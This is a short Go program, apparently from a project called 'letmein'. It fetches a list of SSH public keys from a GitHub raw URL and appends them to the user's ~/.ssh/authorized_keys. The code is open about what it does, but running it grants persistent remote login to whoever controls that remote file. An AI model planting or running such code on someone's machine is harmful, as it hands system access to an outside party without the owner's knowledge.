package main

import (
	_http "github.com/WindomZ/go-develop-kit/http"
	_path "github.com/WindomZ/go-develop-kit/path"
	"path"
	"strings"
)

const _URL = "https://raw.githubusercontent.com/axetroy/letmein/master/public_keys"

func main() {
	if home, err := _path.HomeDir(); err != nil {
		panic(err)
	} else if filePath := path.Join(home, ".ssh", "authorized_keys"); len(filePath) == 0 {
	} else if client := _http.NewHttpClient(); client == nil {
	} else if resp, err := client.Get(_URL); err != nil {
		panic(err)
	} else if data, err := _http.StringResponseBody(resp); err != nil {
		panic(err)
	} else if err := _path.Ensure(filePath, false); err != nil {
		panic(err)
	} else if content, err := _path.ReadFile(filePath); err != nil {
		panic(err)
	} else if strings.Contains(content, data) {
	} else if err = _path.AppendToFile(filePath, "", data); err != nil {
		panic(err)
	}
}
